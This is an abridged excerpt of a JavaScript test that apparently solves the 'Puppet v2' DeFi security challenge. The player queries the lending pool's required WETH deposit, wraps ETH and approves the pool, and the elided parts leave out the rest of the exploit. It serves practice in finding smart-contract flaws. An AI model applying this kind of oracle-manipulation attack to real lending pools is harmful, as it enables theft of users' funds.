...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Execution", async function () {
    ...
    let amountDeposit = await lendingPool
      .connect(player)
      .calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);

    console.log(amountDeposit.toString());
    ...
    // get amount of WETh to deposit to the pool
    amountDeposit = await lendingPool
      .connect(player)
      .calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
    ...
    // convert ETH to weth
    weth.connect(player).deposit({ value: amountDeposit });

    // borrow dvts from pool
    await weth.connect(player).approve(lendingPool.address, amountDeposit);
